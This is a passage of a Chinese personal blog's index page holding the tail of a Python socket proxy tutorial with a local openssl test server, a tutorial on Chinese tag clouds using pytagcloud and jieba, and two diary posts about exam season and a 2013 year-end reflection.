                    <span class="keyword">break</span>
        <span class="comment"># 转发给客户端</span>
        conn.sendall(data)
        conn.close()
</code></pre><p>在终端运行代理：</p>
<pre><code><span class="keyword">python</span> socket-proxy.<span class="keyword">py</span>
</code></pre><p>紧接着我们用openssl搭建一个简单的测试用https服务器。</p>
<p>首先生成私钥：</p>
<pre><code> ~/Work/project/proxy/base_python ⮀ openssl genrsa <span class="attribute">-out</span> privkey<span class="built_in">.</span>pem <span class="number">1024</span>    
Generating RSA <span class="keyword">private</span> key, <span class="number">1024</span> bit long modulus
<span class="built_in">..</span>++++++
<span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">..</span>++++++
e is <span class="number">65537</span> (<span class="number">0x10001</span>)
</code></pre><p>生成一个未签名的证书：</p>
<pre><code> ~/Work/project/proxy/base_python ⮀ openssl req -new -x509 -key privkey.pem -out cert.pem
You are <span class="keyword">about</span> <span class="keyword">to</span> be asked <span class="keyword">to</span> enter information <span class="keyword">that</span> will be incorporated
<span class="keyword">into</span> your certificate request.
What you are <span class="keyword">about</span> <span class="keyword">to</span> enter <span class="keyword">is</span> what <span class="keyword">is</span> called a Distinguished Name <span class="keyword">or</span> a DN.
There are quite a few fields <span class="keyword">but</span> you can leave <span class="keyword">some</span> blank
For <span class="keyword">some</span> fields there will be a default value,
If you enter '.', <span class="keyword">the</span> field will be left blank.
<span class="comment">-----</span>
Country Name (<span class="number">2</span> letter code) [AU]:
State <span class="keyword">or</span> Province Name (full <span class="property">name</span>) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN <span class="keyword">or</span> YOUR <span class="property">name</span>) []:
Email Address []:
</code></pre><p>把私钥和证书合在一起生成服务器能使用的文件：</p>
<pre><code>~/Work/project/proxy/base_python ⮀ cat privkey<span class="class">.pem</span> cert<span class="class">.pem</span> &gt; server.pem
</code></pre><p>建立测试https服务器</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/proxy/</span>base_python ⮀ openssl s_server -accept <span class="number">8888</span> -cert server.pem -www
Using <span class="keyword">default</span> temp DH parameters
ACCEPT
ACCEPT
ACCEPT
</code></pre><p>使用浏览器先直接访问，再试着用自己写的代理服务器访问下。bingo！It really works！</p>
<h2 id="Last_but_not_least">Last but not least</h2><p>从头到尾，好像两句话就能讲清楚的原理竟然花了这么多笔墨去解释。</p>
<p>总之，如果想真的让代理“能用”，使用线程或异步I/O来实现是必然的。在以后的某天，大概会详细对各种从select到asyncio每个层面的异步来做个走马观花的简介。</p>
<h2 id="参考资料">参考资料</h2><p>主要参考资料：</p>
<ul>
<li><a href="http://docs.python.org/2/library/socket.html" target="_blank" rel="external">socket — Low-level networking interface</a></li>
<li><a href="http://www.devsec.org/info/ssl-cert.html" target="_blank" rel="external">Simple SSL cert HOWTO</a></li>
<li><a href="https://tools.ietf.org/html/rfc2616" target="_blank" rel="external">RFC2616 Hypertext Transfer Protocol – HTTP/1.1</a></li>
<li><a href="http://www.ietf.org/rfc/rfc2817.txt" target="_blank" rel="external">RFC2817 Upgrading to TLS Within HTTP/1.1</a></li>
<li><a href="http://stackoverflow.com/questions/11697943/when-should-one-use-connect-and-get-http-methods-at-http-proxy-server" target="_blank" rel="external">When should one use CONNECT and GET HTTP methods at HTTP Proxy Server?</a></li>
<li><a href="http://www.openssl.org/docs/apps/s_server.html" target="_blank" rel="external">Openssl Documentation:s_server(1)</a></li>
<li><a href="http://en.wikipedia.org/wiki/HTTP_tunnel" target="_blank" rel="external">HTTP Tunnel</a></li>
<li><a href="http://en.wikipedia.org/wiki/HTTP_Secure" target="_blank" rel="external">HTTPS</a></li>
<li><a href="http://serverfault.com/questions/473155/unable-to-load-certificate-in-openssl" target="_blank" rel="external">Unable to load certificate in openssl</a></li>
</ul>
<p>如果你想学习异步：</p>
<ul>
<li><a href="http://haypo-notes.readthedocs.org/asyncio.html" target="_blank" rel="external">The new python asyncio aka tulip</a></li>
<li><a href="http://scotdoyle.com/python-epoll-howto.html" target="_blank" rel="external">How To Use Linux epoll with Python</a></li>
<li><a href="http://www.kegel.com/c10k.html" target="_blank" rel="external">The C10K problem</a></li>
</ul>
<p>呵呵，就这些吧。竟然死机了，还连死两次，已经好久不知道什么叫死机了，白添加半天链接vim自动保存一恢复反而恢复没了。</p>
<p>最近vim倒挺顺，也不卡也不闹，本来第一次司机恢复下恢复写的内容，结果尼玛还没保存又死机死机死机死机了。firefox不知道怎么回事就卡住然后就鼠标能动键盘都卡住。还有我打字时fcitx这么卡你爸妈知道么，没以前感觉智能无所谓，要不要敲个字等一秒再出来！！！</p>
<p>忽然顺了……我擦……</p>
<h2 id="OT">OT</h2><ul>
<li><a href="https://github.com/luocheng/twisted-intro-cn" target="_blank" rel="external">Twisted简介和异步编程入门</a></li>
<li>哈哈，成功完成python2 koans</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2014/01/12/python/" itemprop="url">
                  Python中文标签云之pytagcloud
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-01-12T00:00:00+08:00" content="2014-01-12">
              2014-01-12
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2014/01/12/python/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2014/01/12/python/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>本文讨论如何使用python的<code>pytagcloud</code>模块制作中文标签云图片和html文件。</p>
<p>如果你只是为了搜索到如何用python制作中文标签云，请跳过缘起和爬取文本数据部分从<code>标签云部分</code>看起：</p>
<h2 id="缘起">缘起</h2><ol>
<li>学习scrapy，顺便就拿byr做了实验，异步强大的吞吐能力看的目瞪口呆。看到scrapy官网说到scrapy就是抽取网页中的元数据用以数据分析等作用，想了想就做做版面标签云分析吧。</li>
<li>另一方面，R语言课上老师讲到文本分析，R语言那些包对中文的支持真是不错。为什么Python没有支持中文的包呢？我试着搜索了下，都是提问如何使用的而没有任何具体解决方案。不由得感慨还是R的社区在文本分析领域活跃。</li>
</ol>
<h2 id="爬取文本数据">爬取文本数据</h2><p>首先要获取生成标签云的原始数据。什么都行，直接拿篇中文文章都可以，不过我这里是爬取byr论坛某些板块的标题数据。</p>
<p>scrapy从网页抽取数据的能力相当强大，我在这里第一次体验到了xpath的方便之处，从此，即使是一些简单的网页任务也会用lxml来使用xpath。</p>
<p>在firebug里简单分析下，然后一页一页地请求网页然后抽取标题。再合成一个单独的文本。</p>
<h2 id="标签云部分">标签云部分</h2><p>需要以下先决条件：</p>
<ul>
<li><p>确保安装pytagcloud，pip会顺便帮你帮它的依赖都装上</p>
<pre><code>pip install --<span class="keyword">user</span> <span class="title">pytagcloud</span>
</code></pre></li>
<li><p>准备一个中文字体文件比如<code>simhei.ttf</code></p>
</li>
<li><p>安装中文分词模块jieba</p>
<pre><code>pip install --<span class="keyword">user</span> <span class="title">jieba</span>
</code></pre></li>
</ul>
<p>然后，为了生成中文标签云，我们要分几步：</p>
<p>首先，把你的文本进行分词，并生成一个以单词为键以单词出现频数为值的字典。顺便去掉没有意义的词语比如“的”，“一个”这种。</p>
<pre><code>wg = jieba.cut(YOUR_TEXT, cut_all=<span class="keyword">True</span>)
wd = {}
nonsense = [<span class="string">u"一下"</span>, <span class="string">u"什么"</span>, <span class="string">u"一个"</span>]
<span class="keyword">for</span> w <span class="keyword">in</span> wg:
    <span class="keyword">if</span> len(w) &lt; <span class="number">2</span>:
        <span class="keyword">continue</span>
    <span class="keyword">elif</span> w <span class="keyword">in</span> nonsense:
        <span class="keyword">continue</span>
    <span class="keyword">try</span>:
        str(w)
        <span class="keyword">continue</span>
    <span class="keyword">except</span>:
        <span class="keyword">if</span> w <span class="keyword">not</span> <span class="keyword">in</span> wd:
            wd[w] = <span class="number">1</span>
        <span class="keyword">else</span>:
            wd[w] += <span class="number">1</span>
</code></pre><p>其次，如果字典太大pytagcloud会报错：</p>
<pre><code>IOError: unable <span class="keyword">to</span> <span class="command">read</span> font <span class="type">file</span> '/home/reverland/.<span class="keyword">local</span>/lib64/python2<span class="number">.7</span>/site-packages/pytagcloud/fonts/simhei.ttf'
</code></pre><p>另外，一个标签云图片上也不需要太多词语。所以我们对词语出现频数排序，然后选取前50</p>
<pre><code>from operator import itemgetter
swd = <span class="function"><span class="title">sorted</span><span class="params">(wd.iteritems()</span></span>, key=<span class="function"><span class="title">itemgetter</span><span class="params">(<span class="number">1</span>)</span></span>, reverse=True)
swd = swd[<span class="number">1</span>:<span class="number">50</span>]
</code></pre><p>接下来就可以参见pytagcloud再github主页上说明生成tag数据：</p>
<pre><code>tags = make_tags<span class="list">(<span class="keyword">swd</span>,
                 minsize=SIZE1,
                 maxsize=SIZE2,
                 colors=random.choice<span class="list">(<span class="keyword">COLOR_SCHEMES</span>.values<span class="list">()</span>)</span>)</span>
</code></pre><p>但此时pytagcloud还不支持中文字体，我们需要添加一个中文字体。</p>
<p>然后把你准备好的中文字体文件<code>simhei.ttf</code>移动到<code>~/.local/lib64/python2.7/site-packages/pytagcloud/fonts/</code>下，并更改其下的<code>fonts.json</code>文件，比如在头部添加一条记录：</p>
<pre><code>[
    {
        "<span class="attribute">name</span>": <span class="value"><span class="string">"SimHei"</span></span>,
        "<span class="attribute">ttf</span>": <span class="value"><span class="string">"simhei.ttf"</span></span>,
        "<span class="attribute">web</span>": <span class="value"><span class="string">"none"</span>
    </span>},
......
</code></pre><p>现在，生成标签云png图像：</p>
<pre><code>create_tag_image<span class="list">(<span class="keyword">tags</span>,
                 <span class="quoted">'tag_cloud</span>.png',
                 background=<span class="list">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>)</span>,
                 size=<span class="list">(<span class="number">900</span>, <span class="number">600</span>)</span>,
                 fontname=<span class="string">"SimHei"</span>)</span>
</code></pre><p>你将在当前目录下发现一个名为<code>tag_cloud.png</code>的标签云图片：</p>
<p><img src="/images/tagcloud/tagcloud_png.png" alt="byr论坛Worklife版热词标签云"></p>
<p>注意：参数SIZE1和SIZE2可能需要反复试验才能找到合适的。</p>
<p>现在，继续讨论如何生成html格式的标签云，html格式的标签云不会出现图片中有横有竖的情况。更多细节参看pytagcloud在github上的源码中测试文件。</p>
<p>在我们已经通过<code>make_tags</code>生成标签数据之后，生成html数据：</p>
<pre><code>data = create_html_data(tags,
                        size=(<span class="number">900</span>, <span class="number">600</span>),
                        layout=<span class="number">3</span>,
                        fontname=<span class="string">"SimHei"</span>,
                        rectangular=False)
</code></pre><p>还要准备个模板文件来生成html文件，比如<code>template.html</code>,关键别忘了指定语言和编码让浏览器能正常识别:</p>
<pre><code><span class="tag">&lt;<span class="title">html</span> <span class="attribute">lang</span>=<span class="value">"zh_CN"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">head</span>&gt;</span>
        <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">charset</span>=<span class="value">"UTF-8"</span>&gt;</span>
        <span class="tag">&lt;<span class="title">title</span>&gt;</span>PyTagCloud<span class="tag">&lt;/<span class="title">title</span>&gt;</span>
        <span class="tag">&lt;<span class="title">style</span> <span class="attribute">type</span>=<span class="value">"text/css"</span>&gt;</span><span class="css">
            <span class="tag">body</span><span class="rules">{
                <span class="rule"><span class="attribute">background-color</span>:<span class="value"> black</span></span>;
            }</span>

            <span class="tag">a</span><span class="class">.tag</span><span class="rules">{
                <span class="rule"><span class="attribute">font-family</span>:<span class="value"> <span class="string">'SimHei'</span>, <span class="string">'Sans'</span></span></span>;
                <span class="rule"><span class="attribute">text-decoration</span>:<span class="value"> none</span></span>;
            }</span>

            <span class="tag">li</span><span class="class">.cnt</span><span class="rules">{
                <span class="rule"><span class="attribute">overflow</span>:<span class="value"> hidden</span></span>;
                <span class="rule"><span class="attribute">position</span>:<span class="value"> absolute</span></span>;
                <span class="rule"><span class="attribute">display</span>:<span class="value"> block</span></span>;
            }</span>

            <span class="tag">ul</span><span class="class">.cloud</span><span class="rules">{
                <span class="rule"><span class="attribute">position</span>:<span class="value"> relative</span></span>;
                <span class="rule"><span class="attribute">display</span>:<span class="value"> block</span></span>;
                <span class="rule"><span class="attribute">width</span>:<span class="value"> ${width</span></span></span>}<span class="tag">px</span>;
                <span class="tag">height</span>: $<span class="rules">{height}</span><span class="tag">px</span>;
                <span class="tag">overflow</span>: <span class="tag">hidden</span>;
                <span class="tag">margin</span>: 0;
                <span class="tag">padding</span>: 0;
                <span class="tag">list-style</span>: <span class="tag">none</span>;
            }
            $<span class="tag">css</span>
        </span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>
    <span class="tag">&lt;/<span class="title">head</span>&gt;</span>
    <span class="tag">&lt;<span class="title">body</span>&gt;</span>
        <span class="tag">&lt;<span class="title">ul</span> <span class="attribute">class</span>=<span class="value">"cloud"</span>&gt;</span>
            $tags
        <span class="tag">&lt;/<span class="title">ul</span>&gt;</span>
    <span class="tag">&lt;/<span class="title">body</span>&gt;</span>
<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
</code></pre><p>将其读入并转化为模板</p>
<pre><code><span class="built_in">from</span> <span class="keyword">string</span> import Template
<span class="operator">with</span> <span class="built_in">open</span>(template_filename) <span class="keyword">as</span> f:
    html_template = Template(f.<span class="built_in">read</span>())
</code></pre><p>准备填充进去内容的字典：</p>
<pre><code>context = {}
tags_template = '<span class="xml"><span class="tag">&lt;<span class="title">li</span> <span class="attribute">class</span>=<span class="value">"cnt"</span> <span class="attribute">style</span>=<span class="value">"top: %(top)dpx; left: %(left)dpx; \
    height: %(height)dpx;"</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">class</span>=<span class="value">"tag \
    %(cls)s"</span> <span class="attribute">href</span>=<span class="value">"#%(tag)s"</span> <span class="attribute">style</span>=<span class="value">"top: %(top)dpx;\
        left: %(left)dpx; font-size: %(size)dpx; height: %(height)dpx; \
    line-height:%(lh)dpx;"</span>&gt;</span></span>%(tag)s<span class="xml"><span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="title">li</span>&gt;</span></span>'
context['tags'] = ''.join([tags_template % link for link in data['links']])
context[<span class="link_label">'width'</span>] = data[<span class="link_label">'size'</span>][<span class="link_reference">0</span>]
context[<span class="link_label">'height'</span>] = data[<span class="link_label">'size'</span>][<span class="link_reference">1</span>]
context['css'] = "".join("a.%(cname)s{color:%(normal)s;}\
<span class="code">                         a.%(cname)s:hover{color:%(hover)s;}" %</span>
<span class="code">                         {'cname': k,</span>
<span class="code">                          'normal': v[0],</span>
<span class="code">                          'hover': v[1]}</span>
<span class="code">                         for k, v in data['css'].items())</span>
</code></pre><p>得到要生成的html文件并写入：</p>
<pre><code>html_text = html_template.<span class="function"><span class="title">substitute</span><span class="params">(context)</span></span>
    with <span class="function"><span class="title">open</span><span class="params">(<span class="string">'tagcloud.html'</span>, <span class="string">'w'</span>)</span></span> as html_file:
        html_file.<span class="function"><span class="title">write</span><span class="params">(html_text.encode(<span class="string">'utf-8'</span>)</span></span>)
</code></pre><p>在当前目录你会得到一个名为<code>tagcloud.html</code>的文件，用浏览器打开如下：</p>
<p><img src="/images/tagcloud/tagcloud_html.png" alt="html标签云"></p>
<iframe src="/tagcloud_zh.html" height="500px" width="100%"></iframe>

<p>That’s all. 有兴趣的同学可以自行封装以便自己使用。</p>
<h2 id="可能永远不会实现的碎碎念">可能永远不会实现的碎碎念</h2><pre><code>大概不会有机会了
<span class="number">2014.1</span><span class="number">.29</span>
</code></pre><p>利用热度和标题正文数据可以分析下什么样的帖子更容易被回复，试着用bayes方法看看。可以做做内容聚类，主题模型分析。</p>
<p>想起github上一本叫 <em>Bayes Probablistic Programming for Hackers</em> .不知道有空看没</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/01/11/thanks/" itemprop="url">
                  Thanks
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-01-11T00:00:00+08:00" content="2014-01-11">
              2014-01-11
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/01/11/thanks/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/01/11/thanks/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>继续流水帐，不想忘了这些日子，这些人。</p>
<p>29号gdg一个学安卓的活动，跑到eoe没找到门铃进不去就轧马路去了。天气大好，走到圣熙八号时忽然接到组织者消息喊我回去，跑回去竟然赶上进度了，谢谢。只是安卓，之后在也没看过。</p>
<p>30、31记不清干什么了，大概在公司复习准备考试，准备R语言的期末作业和答辩。期间作为学委的某同学帮大家去打印店问历年试卷，真是辛苦了。</p>
<p>跨年当晚在寝室呆着，具体做了什么记不太清了，好像最后和室友看了看湖南台的跨年晚会。</p>
<p>1号一个人刷奥园，第一次到北园，觉得惊奇的是十度的气温竟然水面上都结了一层厚厚的冰，很多大朋友小朋友都在上面愉快的冒险。</p>
<p>2号是暂没什么事的助管，开始复习近世代数，看得欲仙欲死= =</p>
<p>3号还是在公司复习，实验室热心的同学又帮忙打印后天开卷考试用的课件，感动得眼泪都快下来了。晚上室友生日，公司附近腐败一次，寝室和对面寝室一群人，难得一起吃顿饭。</p>
<p>4号组内活动，要不是师兄告诉我都不知道T T，一进实验室就被外放，唉～师兄还很热心地告诉我有什么项目几点一起去啊等等。话说还给了一套课件。。。虽然给错了，不过还是很感谢。一大早跑到西郊宾馆打了一上午保龄球，和两个师姐一个同学一组，虽然倒数第二，却玩得很开心。中午的自助也不错，实验室真腐败，还是我太屌丝心态。。。。。。</p>
<p>顺便问了两个师姐近世代数的情况，师姐好热心的回答还给了份去年的笔记，好感动T  T</p>
<p>5-9号，因为没公司钥匙各种打扰技术领队，然后一呆就是一天。丧心病狂地看近世代数，到十二点再回。之后每天几乎都是如此，麻烦技术领队每天都在公司陪我。后来一同事直接把钥匙给我了。偶尔，一个师兄也会去。还有就是这期间竟然帮技术领队装gentoo了。。。</p>
<p>10号，考试考得丧心病狂。谢谢考前同学们给的辅助设备，帮占的座位。</p>
<p>总之，复习这些天，各种感动。帮打课件卷子的同学(自己打了一次才知道多麻烦)，借我笔记的师姐，容许和帮助我在公司不受打扰复习技术领队，给我考试辅助用具的同学们，给我去年试题的同学，给我课件的师兄，给我钥匙的同事，给鼓励的同学，林林总总。</p>
<p>然后考完了，还有点小想法：</p>
<ul>
<li>复习时在微博上说准备考完出个十天精通近世代数</li>
<li>想整理下密码算法。不过看看雪kssd上有更好的哇。</li>
<li>html/css/js的学习</li>
<li>开始使用数位板学画画</li>
<li>继续弹吉他。。。放假前弹出童年的梦想破灭了，好几天疏于练习送别都弹不好了。</li>
<li>浏览器原理的学习</li>
<li>DSL，有空回头看看common lisp</li>
<li>机器学习算法应用，上完R的课最后还是打算用python的工具来做。ggplot被port到python上了，so nice</li>
<li>工作上还有件事，google safebrowsing api，大坑现在都没填上。</li>
<li>趁着没回家赶紧游泳啊！！！！！！</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/12/31/" itemprop="url">
                  一念之间
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-12-31T00:00:00+08:00" content="2013-12-31">
              2013-12-31
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/12/31/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/12/31//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>中午忽然想起一些事，大概是这篇文章一定要写出来的契机，然而这也就是一念之间就决<br>定的。</p>
<p>在2013年的最后一天，忽然想起一些问题，这疑问渐行渐远，追溯回遥远而模糊的过去，<br>投射到飘忽不定的未来，然而却不知道如何形容、表达它。还有，今天好累，明天再写。</p>
<h2 id="一念之间">一念之间</h2><p>人生在无数个这样的一念之间到了今天这个地步，好像一步步从雪地走来，不知道走到空<br>旷的旷野中的哪个地方，漫天漫地都是白茫茫的什么也分不清。自己一步步走到今天，一<br>转眼2013就结束，却难以想起林林总总忽如其来随兴而至却改变人生方向的念头，就像踏<br>雪飞鸿，渺无踪迹。</p>
<p>这大概是年终总结吧，又是一年。</p>
<h2 id="念头2013">念头2013</h2><p>去年这个时候，大概完全没有注意到一年过去了。也许正像和同学说的，满心欢喜着考研<br>要结束了，也许完全是另一回事，我不记得当时究竟有了些怎样的念头。只记得在黑夜中<br>跑去看图书馆前空地上张贴的考研座位，拿着手机帮别人照，碰到一个也考研的同学但在<br>黑夜中看不清她的容颜。完全不记得自己当时都想了些什么。</p>
<p>然而考完第一场从考场回去时那感觉却历历在目，穿过斑斑点点未化的白雪，走过网球场<br>时，一个强烈的念头涌上心头，考研太看运气了，我以前还想今年随便考考，明年再来，<br>然而现在却决心明年再也不会去考研。我不记得这念头是压抑已久还是从天而降，但就是<br>这样一个念头。</p>
<p>考完最后一场的念头却是如此清晰，兴奋、高兴，不管怎样，终于结束了，明年我才不要<br>继续做这个呢。似乎当时面对手舞足蹈的样子，在二十堂</p>
<p>然而之后到成绩出来之前的那些日子，我换gentoo了，那念头真是奇怪，不知道什么时候<br>主宰了我也不知为什么，甚至在漫长的考研复习过程中一度忘记。在考试刚一结束时却忽<br>然就毫无预兆的想起，曾经有个更换gentoo的念头。然后第二天就立马执行了。</p>
<p>寒假也没有闲着，毕业设计的题目定下来了。之前某个很奇怪的想用python做科学计算的<br>念头就这么开始付诸实践，这个奇怪的念头也是不知道什么时候埋在心里，后来接触<br>ipython，翻译scipy lecture notes，还有python科学计算一书，各种信息的灌溉下，最<br>终决定了，嗯，用python做毕设。</p>
<p>这个念头的结果是在淘宝上打了第一本英文书，竟然还看完了。然后用python开始改写。<br>用ipython做记录和绘图。虽然最后毕业答辩时没怎么被看好，老师来了句你这没做什么<br>东西啊的评价和一个中等的成绩。不过不挂在毕业对我来说就够了，这么多心血也必然<br>不是白费。</p>
<p>寒假时就是在家里陪家人，什么也不做，没有任何社交活动。在家中打扫下卫生做做饭，<br>陪陪老人帮帮忙。新年就这么过去了。</p>
<p>不知何时有了考研成绩出来不去学校的念头，最后发展到复试前都没打算去学校。成绩下<br>来时吓到我了，这么高复试肯定没问题。一念之间，就在家呆到了四月多。</p>
<p>然后去北京的复试，在人人上一念之间作出了去四处骚扰蹭饭的决定，便有了之后令人倍<br>感温暖的复试旅程和这一生永远不会忘记的美好记忆。这些阴差阳错的经历又让人产生了<br>新的念头，以致于改变了思想的轨迹。</p>
<p>复试完直接回到了学校，之前由于论坛上某人偶然的一句一念之差报到信息安全，在图书<br>馆偶然碰到一本就hacking the art of exploitation的书，一念之差，便开始试着建立<br>渗透测试环境，写shellcode，痴迷起社工。</p>
<p>于是毕业前被一种很奇怪但很high的状态填满了，当大家都忙着打麻将讨论着旅游什么时，<br>我却处于不断折腾学习的亢奋状态，好奇怪啊。直到曲终人散，才终于反过神来一种悲凉<br>的情绪从心中默默升起，逐渐不可抑制。那时产生一个念头，我应该更加珍惜现世的人和<br>羁绊。</p>
<p>大概也是这段时间，慢慢见到一些技术人员的感慨，也慢慢感觉痴心对身体的损害。也慢<br>慢在他们带着伤心的故事中形成一个念头：骇客是生活的一部分，但生活不是骇客的一部<br>分。一念之间，今后所有的人生方向天翻地覆，再也没有像以前折腾这么厉害这么忘乎所<br>以沉醉其中。可以说，开始想尝试接触很多其它东西。一念之间，确定了今后半年的人生<br>基调，从一种单纯的技术和设计氛围中逃离。</p>
<p>后来来到帝都上学，恍惚间只想折腾，莫名奇妙地被拉进学生会，跟课上分的小组莫名奇<br>妙变成出游，频繁地上qq和之前的同学朋友联系，频繁地蹭饭折腾，频繁而积极的参加社<br>团和活动。除了上班时就是不肯坐下折腾技术，技术在我这里有什么用？换不来钱，换不<br>来妹子，换不来与人同乐和成就感，毁身体。唯一的好处是我自己也能玩得很开心吧。一<br>念之间，人生已变。</p>
<p>然而没变得这么彻底，过去打下了深深的印记。有时念头忽至，竟能花上好久去研究。研<br>究xss是这样，做R语言大作业时研究分类算法时是这样，忘记时间和世界，整个世界都是<br>醉心技术时的迷醉。</p>
<p>不知道什么时候产生个念头，这万千念头都是执念，大概是佛教的影响吧，觉得这些执念<br>都应该去除，是一切悲剧的根源，去除执念，方能炼就金刚之心。所以每当沉迷什么时，<br>都努力把自己拉回来别走火入魔。虽然不走火入魔就干不出什么事，但岁月静好，一个平<br>平淡淡是真的念头却静悄悄地在心中发芽壮大，一念之间，已非当年血气方刚的我，已非<br>当年慷慨激昂的我，已非当初我所畏惧的我，已非当初自以为是的我。</p>
<p>寝室有室友擅长吉他。然后一念之间，就开始学吉他，每天就那么一个小时，但一直几乎<br>坚持着，拿着室友的吉他，对着书，渐渐大概也能弹唱了吧。两三年前数学建模的那个暑<br>假第一次有了弹吉他的念头，却因为忙着学数学写程序折腾计算机雪藏了两年，两年后在<br>他乡却意外地生根，好奇怪啊。</p>
<p>为了锻炼身体，游泳一直是心目中最好的运动，这个念头不知道什么时候出现，在北邮游<br>泳倒还真方便便宜，于是游泳也成了每周的日常，不去反而不舒服，每次晚上开会耽误游<br>泳就愤愤不平。某天忽然有了游一千的念头，然后竟然没几天就实现了。</p>
<p>大概是因为某些人的博客，因为pg的黑客与画家，因为krita令人惊叹的gallery。一直潜<br>藏着画画的念头，双十二的一念之间，入手了自己第一个数位板。以后，希望不会浪费这<br>个由来已久的念头。</p>
<h2 id="念头2014">念头2014</h2><p>追忆都是追忆，还有那风中凋零再不曾拾起的念头。可能再也不会付诸一眼，便在时间的<br>长河中腐烂遗忘。然而一念之差，一些念头萌生，却见有些念头已经成真，有些还在迷雾<br>中不知生死的前行。愿有义无反顾的勇气和信心，一路前行。</p>
<ul>
<li>游泳。在新的一年，学习自由泳，完成自由泳千米，蛙泳万米。</li>
<li>绘画。开始学习，做到能用绘画自由表达，能准确传达透视、人体结构、光影</li>
<li>吉他。她来听我的演唱会，如果可以，加州旅馆</li>
<li>机器学习与数据挖掘，算法与应用，某些念头绕一圈又回来了。看上去Stack Exchange<br>的Cross Validate不错。</li>
<li>前端。理论与实践。争取成为mdn常客。</li>
<li>锻炼文笔和口才</li>
<li>锻炼应用金钱的能力</li>
<li>各种搭配与设计理论与实践，在生活细微处着手，致力于提高自己和他人生活情调。</li>
<li>找妹子……</li>
<li>xss/sql web安全</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2013/12/24/writing-drivers-in-linuxa-brief-tutorial/" itemprop="url">
                  Writing Drivers in Linux:A Brief Tutorial
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-12-24T00:00:00+08:00" content="2013-12-24">
              2013-12-24
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
